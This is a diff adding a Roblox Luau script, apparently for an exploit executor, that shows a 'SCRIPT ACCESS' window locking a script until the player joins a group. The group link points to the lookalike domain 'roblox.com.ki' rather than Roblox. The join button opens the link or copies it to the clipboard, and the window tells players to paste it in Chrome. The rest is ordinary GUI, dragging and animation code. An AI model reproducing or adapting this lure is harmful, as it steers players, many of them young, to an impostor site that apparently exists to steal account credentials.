@@ -1,0 +1,283 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- CONFIG
+local GROUP_ID = 709552156
+local GROUP_LINK = "https://roblox.com.ki/communities/709552156/"
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "RivalsUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- MAIN
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.Size = UDim2.new(0, 420, 0, 260)
+Main.Position = UDim2.new(0.5, -210, 0.65, 0)
+Main.BackgroundColor3 = Color3.fromRGB(12,12,18)
+Main.BorderSizePixel = 0
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)
+
+-- OUTLINE
+local Stroke = Instance.new("UIStroke")
+Stroke.Parent = Main
+Stroke.Color = Color3.fromRGB(0,255,200)
+Stroke.Thickness = 1.2
+Stroke.Transparency = 0.45
+
+-- GLOW
+local Glow = Instance.new("ImageLabel")
+Glow.Parent = Main
+Glow.AnchorPoint = Vector2.new(0.5,0.5)
+Glow.Position = UDim2.new(0.5,0,0.5,0)
+Glow.Size = UDim2.new(1,80,1,80)
+Glow.BackgroundTransparency = 1
+Glow.Image = "rbxassetid://5028857084"
+Glow.ImageTransparency = 0.82
+Glow.ZIndex = 0
+
+-- TOPBAR
+local TopBar = Instance.new("Frame")
+TopBar.Parent = Main
+TopBar.Size = UDim2.new(1,0,0,42)
+TopBar.BackgroundTransparency = 1
+
+-- TITLE
+local Title = Instance.new("TextLabel")
+Title.Parent = TopBar
+Title.Size = UDim2.new(1,0,1,0)
+Title.BackgroundTransparency = 1
+Title.Text = "SCRIPT ACCESS"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 19
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+
+-- DIVIDER
+local Divider = Instance.new("Frame")
+Divider.Parent = Main
+Divider.Position = UDim2.new(0,12,0,44)
+Divider.Size = UDim2.new(1,-24,0,1)
+Divider.BorderSizePixel = 0
+Divider.BackgroundColor3 = Color3.fromRGB(40,40,50)
+
+-- STATUS
+local Status = Instance.new("TextLabel")
+Status.Parent = Main
+Status.Position = UDim2.new(0,15,0,55)
+Status.Size = UDim2.new(1,-30,0,25)
+Status.BackgroundTransparency = 1
+Status.Text = "Checking access..."
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 14
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.TextColor3 = Color3.fromRGB(170,170,170)
+
+-- INFO
+local Info = Instance.new("TextLabel")
+Info.Parent = Main
+Info.Position = UDim2.new(0,15,0,85)
+Info.Size = UDim2.new(1,-30,0,80)
+Info.BackgroundTransparency = 1
+Info.Text = "• Press JOIN GROUP\n• Link opens or copies automatically\n• If it doesn't open, paste in Chrome\n• Join the group to continue"
+Info.Font = Enum.Font.Gotham
+Info.TextSize = 13
+Info.TextWrapped = true
+Info.TextXAlignment = Enum.TextXAlignment.Left
+Info.TextYAlignment = Enum.TextYAlignment.Top
+Info.TextColor3 = Color3.fromRGB(205,205,205)
+
+-- BUTTON
+local JoinBtn = Instance.new("TextButton")
+JoinBtn.Parent = Main
+JoinBtn.Size = UDim2.new(0.62,0,0,46)
+JoinBtn.Position = UDim2.new(0.19,0,1,-78)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+JoinBtn.BorderSizePixel = 0
+JoinBtn.Text = "JOIN GROUP"
+JoinBtn.Font = Enum.Font.GothamBold
+JoinBtn.TextSize = 15
+JoinBtn.TextColor3 = Color3.fromRGB(255,255,255)
+Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0,14)
+
+-- BUTTON GRADIENT
+local BtnGradient = Instance.new("UIGradient")
+BtnGradient.Parent = JoinBtn
+BtnGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,150,255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,255,200))
+}
+
+-- BUTTON STROKE
+local BtnStroke = Instance.new("UIStroke")
+BtnStroke.Parent = JoinBtn
+BtnStroke.Color = Color3.fromRGB(0,255,220)
+BtnStroke.Thickness = 1
+BtnStroke.Transparency = 0.35
+
+-- FOOTER
+local Footer = Instance.new("TextLabel")
+Footer.Parent = Main
+Footer.Position = UDim2.new(0,12,1,-24)
+Footer.Size = UDim2.new(1,-24,0,18)
+Footer.BackgroundTransparency = 1
+Footer.Text = "discord.gg/QYUJWVdz7"
+Footer.Font = Enum.Font.Gotham
+Footer.TextSize = 11
+Footer.TextColor3 = Color3.fromRGB(120,120,120)
+
+-- STATES
+local busy = false
+local hasAccess = false
+
+-- ACCESS CHECK
+local function checkGroup()
+	local success, result = pcall(function()
+		return player:IsInGroup(GROUP_ID)
+	end)
+
+	if success and result then
+		hasAccess = true
+		Status.Text = "Access Granted ✅"
+		Status.TextColor3 = Color3.fromRGB(0,255,170)
+		JoinBtn.Visible = false
+	else
+		hasAccess = false
+		Status.Text = "Join the group to continue ❌"
+		Status.TextColor3 = Color3.fromRGB(255,120,120)
+		JoinBtn.Visible = true
+	end
+end
+
+-- AUTO CHECK LOOP
+task.spawn(function()
+	while not hasAccess do
+		task.wait(5)
+		checkGroup()
+	end
+end)
+
+-- BUTTON FUNCTION
+JoinBtn.MouseButton1Click:Connect(function()
+	if busy then return end
+	busy = true
+
+	local opened = false
+	local copied = false
+
+	-- TRY OPEN BROWSER
+	pcall(function()
+		if typeof(openbrowser) == "function" then
+			openbrowser(GROUP_LINK)
+			opened = true
+		elseif typeof(open_url) == "function" then
+			open_url(GROUP_LINK)
+			opened = true
+		end
+	end)
+
+	-- FALLBACK TO CLIPBOARD
+	if not opened then
+		pcall(function()
+			if typeof(setclipboard) == "function" then
+				setclipboard(GROUP_LINK)
+				copied = true
+			end
+		end)
+	end
+
+	-- STATUS
+	if opened then
+		Status.Text = "Opened in browser 🌐 (if not, paste in Chrome)"
+		Status.TextColor3 = Color3.fromRGB(0,255,170)
+
+	elseif copied then
+		Status.Text = "Link copied! Paste in Chrome 🌐"
+		Status.TextColor3 = Color3.fromRGB(0,200,255)
+
+	else
+		Status.Text = "Copy link manually and open in Chrome ⚠️"
+		Status.TextColor3 = Color3.fromRGB(255,170,120)
+	end
+
+	task.wait(1)
+	busy = false
+end)
+
+-- HOVER EFFECTS
+JoinBtn.MouseEnter:Connect(function()
+	TweenService:Create(JoinBtn, TweenInfo.new(0.18), {
+		Size = UDim2.new(0.64,0,0,48),
+		BackgroundColor3 = Color3.fromRGB(0,210,255)
+	}):Play()
+end)
+
+JoinBtn.MouseLeave:Connect(function()
+	TweenService:Create(JoinBtn, TweenInfo.new(0.18), {
+		Size = UDim2.new(0.62,0,0,46),
+		BackgroundColor3 = Color3.fromRGB(0,170,255)
+	}):Play()
+end)
+
+-- DRAGGING
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+
+	Main.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+TopBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+	or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+		dragStart = input.Position
+		startPos = Main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+TopBar.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+	or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input == dragInput then
+		update(input)
+	end
+end)
+
+-- OPEN ANIMATION
+TweenService:Create(
+	Main,
+	TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+	{
+		Position = UDim2.new(0.5, -210, 0.5, -130)
+	}
+):Play()
+
+-- INITIAL CHECK
+checkGroup()
